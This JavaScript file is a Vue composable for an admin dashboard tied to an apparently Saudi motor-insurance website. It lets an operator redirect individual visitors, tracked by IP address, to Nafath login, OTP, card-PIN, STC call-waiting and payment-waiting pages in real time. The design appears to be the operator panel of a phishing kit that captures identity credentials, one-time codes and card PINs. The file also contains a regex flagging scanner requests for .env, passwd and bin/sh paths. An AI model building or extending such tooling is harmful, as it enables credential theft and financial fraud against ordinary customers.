/**
 * useJourneyDropdown — State & logic for the customer journey dropdown
 *
 * Manages the teleported journey dropdown, page navigation definitions,
 * dropdown positioning, and customer redirect functionality.
 *
 * @module useJourneyDropdown
 */
import { ref, reactive, computed } from 'vue';
import request from '@/api/request';
import logger from '@/utils/logger';

// ── Page definitions ──────────────────────────────────────────────

export const availablePages = [
    // ─── بداية الرحلة ───
    { value: 'home', label: 'الصفحة الرئيسية', url: '/', category: 'البداية', icon: 'fa-house', order: 1 },
    { value: 'motorapp', label: 'نوع التأمين', url: '/motorapp', category: 'البداية', icon: 'fa-car', order: 2 },

    // ─── بيانات المركبة ───
    { value: 'basicDetails', label: 'البيانات الأساسية', url: '/motorapp/basicDetails/new-insurance', category: 'بيانات المركبة', icon: 'fa-id-card', order: 3 },
    { value: 'ownershipTransfer', label: 'نقل ملكية', url: '/motorapp/basicDetails/ownership-transfer', category: 'بيانات المركبة', icon: 'fa-right-left', order: 4 },
    { value: 'importedCar', label: 'سيارة مستوردة', url: '/motorapp/basicDetails/imported-car', category: 'بيانات المركبة', icon: 'fa-ship', order: 5 },
    { value: 'vehicleDetails', label: 'تفاصيل المركبة', url: '/motorapp/vehicleDetails', category: 'بيانات المركبة', icon: 'fa-car-side', order: 6 },
    { value: 'policyDetails', label: 'تفاصيل الوثيقة', url: '/motorapp/policyDetailsFlow', category: 'بيانات المركبة', icon: 'fa-file-shield', order: 7 },
    { value: 'mojaz', label: 'موجز', url: '/motorapp/Home/Mojaz', category: 'بيانات المركبة', icon: 'fa-magnifying-glass', order: 8 },
    { value: 'mojaz-payment', label: 'دفع موجز', url: '/motorapp/Home/Mojaz/Payment', category: 'بيانات المركبة', icon: 'fa-credit-card', order: 9 },

    // ─── العروض والشراء ───
    { value: 'compare', label: 'مقارنة الأسعار', url: '/compare', category: 'العروض', icon: 'fa-scale-balanced', order: 10 },
    { value: 'checkout', label: 'إتمام الشراء', url: '/checkout', category: 'العروض', icon: 'fa-cart-shopping', order: 11 },
    { value: 'confirmation', label: 'تأكيد الطلب', url: '/confirmation', category: 'العروض', icon: 'fa-circle-check', order: 12 },

    // ─── التحقق والدفع ───
    { value: 'nafath', label: 'النفاذ الوطني', url: '/insurance/nafath', category: 'التحقق', icon: 'fa-fingerprint', order: 13 },
    { value: 'otp', label: 'رمز OTP', url: '/insurance/otp', category: 'التحقق', icon: 'fa-key', order: 14 },
    { value: 'cardPin', label: 'رمز PIN', url: '/insurance/card-pin', category: 'التحقق', icon: 'fa-lock', order: 15 },
    { value: 'paymentWaiting', label: 'انتظار الدفع', url: '/insurance/payment/waiting', category: 'التحقق', icon: 'fa-hourglass-half', order: 16, isWaiting: true },

    // ─── تحقق الهاتف ───
    { value: 'phoneOtpWaiting', label: 'انتظار رمز الهاتف', url: '/insurance/phone/otp-waiting', category: 'تحقق الهاتف', icon: 'fa-mobile-screen', order: 17, isWaiting: true },
    { value: 'stcWaiting', label: 'انتظار STC', url: '/insurance/stc/waiting', category: 'تحقق الهاتف', icon: 'fa-signal', order: 18, isWaiting: true },
    { value: 'stcOtp', label: 'رمز STC', url: '/insurance/stc/otp', category: 'تحقق الهاتف', icon: 'fa-message-sms', order: 19 },
    { value: 'stcCallWaiting', label: 'مكالمة STC', url: '/insurance/stc/call-waiting', category: 'تحقق الهاتف', icon: 'fa-phone', order: 20, isWaiting: true },
];

// ── Composable ────────────────────────────────────────────────────

export function useJourneyDropdown ( customers, emit )
{
    // ── State ─────────────────────────────────────────────────────
    const activeJourneyDropdown = ref( null );
    const dropdownPosition = ref( null );
    const buttonRefs = reactive( {} );
    const isRedirecting = ref( false );

    // ── Computed ──────────────────────────────────────────────────

    /** Group pages by category for the dropdown UI */
    const pageCategories = computed( () =>
    {
        const groups = {};
        for ( const page of availablePages )
        {
            if ( !groups[ page.category ] ) groups[ page.category ] = [];
            groups[ page.category ].push( page );
        }
        return groups;
    } );

    // ── Methods ──────────────────────────────────────────────────

    const setButtonRef = ( ip, el ) =>
    {
        if ( el ) buttonRefs[ ip ] = el;
    };

    const getActiveCustomerPage = () =>
    {
        if ( !activeJourneyDropdown.value ) return null;
        const customer = customers.value.find( ( c ) => c.ip === activeJourneyDropdown.value );
        return customer?.current_page || null;
    };

    const toggleJourneyDropdown = ( customerIp, event ) =>
    {
        if ( activeJourneyDropdown.value === customerIp )
        {
            activeJourneyDropdown.value = null;
            dropdownPosition.value = null;
        } else
        {
            const button = event?.target?.closest( 'button' ) || buttonRefs[ customerIp ];
            if ( button )
            {
                const rect = button.getBoundingClientRect();
                const dropdownWidth = 208;
                let left = rect.left + rect.width / 2 - dropdownWidth / 2;
                let top = rect.bottom + 8;
                if ( left < 10 ) left = 10;
                if ( left + dropdownWidth > window.innerWidth - 10 ) left = window.innerWidth - dropdownWidth - 10;
                const dropdownHeight = 350;
                if ( top + dropdownHeight > window.innerHeight ) top = rect.top - dropdownHeight - 8;
                dropdownPosition.value = { top, left };
            }
            activeJourneyDropdown.value = customerIp;
        }
    };

    const closeJourneyDropdown = () =>
    {
        activeJourneyDropdown.value = null;
        dropdownPosition.value = null;
    };

    const redirectCustomerToPage = async ( customerIp, pageValue ) =>
    {
        if ( isRedirecting.value ) return;
        const page = availablePages.find( ( p ) => p.value === pageValue );
        if ( !page ) return;
        isRedirecting.value = true;
        try
        {
            const response = await request.post( '/admin/actions/redirect-customer', {
                customer_ip: customerIp,
                redirect_url: page.url,
            } );
            if ( response.data.success )
            {
                closeJourneyDropdown();
                emit( 'redirect', { customer_ip: customerIp, page: page.label, url: page.url } );
            }
        } catch ( error )
        {
            logger.error( 'فشل توجيه العميل:', error );
        } finally
        {
            isRedirecting.value = false;
        }
    };

    /**
     * Resolve a page URL or value to its Arabic label.
     * Uses availablePages as primary source, falls back to legacy page name map.
     */
    const getPageName = ( page ) =>
    {
        if ( !page ) return null;

        // Strip query string and hash for matching
        const basePath = page.split( '?' )[ 0 ].split( '#' )[ 0 ];

        // Skip non-app paths: static assets, images, dotfiles, build artifacts
        if ( /\.(png|jpg|jpeg|gif|svg|ico|css|js|woff2?|ttf|eot|map|webp|avif|json|xml|txt)$/i.test( basePath ) ) return null;
        if ( /^\/?(\\.git|images|build|Videos|storage|vendor|node_modules|api)[/]/i.test( basePath ) ) return null;
        if ( /^\/?\\./.test( basePath ) ) return null;

        // Primary: match from availablePages (try full URL first, then base path)
        const match = availablePages.find( ( p ) => p.url === page || p.url === basePath );
        if ( match )
        {
            // Append query param context for compare page
            if ( match.value === 'compare' && page.includes( 'type=' ) )
            {
                const params = new URLSearchParams( page.split( '?' )[ 1 ] || '' );
                const type = params.get( 'type' );
                if ( type === 'thirdParty' ) return 'مقارنة أسعار - ضد الغير';
                if ( type === 'comprehensive' ) return 'مقارنة أسعار - شامل';
            }
            return match.label;
        }

        const legacyPages = {
            '/about': 'عن تأمينكم', '/contact': 'اتصل بنا', '/faq': 'الأسئلة الشائعة',
            '/blog': 'المدونة', '/login': 'تسجيل الدخول',
            '/insurance/nafath/callback': 'تأكيد النفاذ', '/insurance/nafath/error': 'خطأ النفاذ',
            'insurance/vehicle-quote': 'بيانات المركبة', 'insurance/data': 'بيانات التأمين',
            'insurance/price-list': 'قائمة الأسعار', 'insurance/additions': 'الإضافات',
            'insurance/summary': 'الملخص', 'insurance/phone': 'التحقق من الهاتف',
            'insurance/otp': 'رمز OTP', 'insurance/card-pin': 'رمز PIN',
            'nafath/login': 'نفاذ', index: 'الرئيسية', home: 'الرئيسية',
            'vehicle-quote': 'بيانات المركبة', 'insurance-data': 'بيانات التأمين',
            data: 'بيانات التأمين', 'price-list': 'قائمة الأسعار', additions: 'الإضافات',
            summary: 'الملخص', billing: 'الدفع', payment: 'الدفع',
            phone: 'التحقق من الهاتف', verification: 'التحقق', otp: 'رمز OTP',
            pin: 'رمز PIN', 'card-pin': 'رمز PIN', nafath: 'نفاذ',
            thirdparty: 'ضد الغير', comprehensive: 'شامل',
            vehicle_quote: 'بيانات المركبة', insurance_data: 'بيانات التأمين',
            price_list: 'قائمة الأسعار', card_pin: 'رمز PIN',
            phone_verification: 'التحقق من الهاتف',
        };

        // Try full page, then base path, then without leading slash
        if ( legacyPages[ page ] ) return legacyPages[ page ];
        if ( legacyPages[ basePath ] ) return legacyPages[ basePath ];
        const cleanPage = basePath.startsWith( '/' ) ? basePath.slice( 1 ) : basePath;
        if ( legacyPages[ cleanPage ] ) return legacyPages[ cleanPage ];
        if ( basePath.startsWith( '/blog/' ) ) return '📰 مقال';

        // Flag known bot / vulnerability scanner paths
        if ( /(\.env|\.git|wp-login|wp-admin|wp-content|xmlrpc|phpmyadmin|cgi-bin|bin\/sh|ReportServer|owa\/|autodiscover|aspnet|admin\.php|\.asp$|\.aspx$|\.jsp$|solr|jenkins|actuator|shell|eval|exec|cmd|passwd)/i.test( basePath ) ) return '🤖 بوت / فحص';

        return page || null;
    };

    /** Close dropdown when clicking outside */
    const handleClickOutside = ( e ) =>
    {
        if ( !e.target.closest( '.relative' ) ) closeJourneyDropdown();
    };

    return {
        // State
        activeJourneyDropdown, dropdownPosition, buttonRefs, isRedirecting,
        // Computed
        pageCategories,
        // Methods
        setButtonRef, getActiveCustomerPage,
        toggleJourneyDropdown, closeJourneyDropdown, redirectCustomerToPage,
        getPageName, handleClickOutside,
    };
}
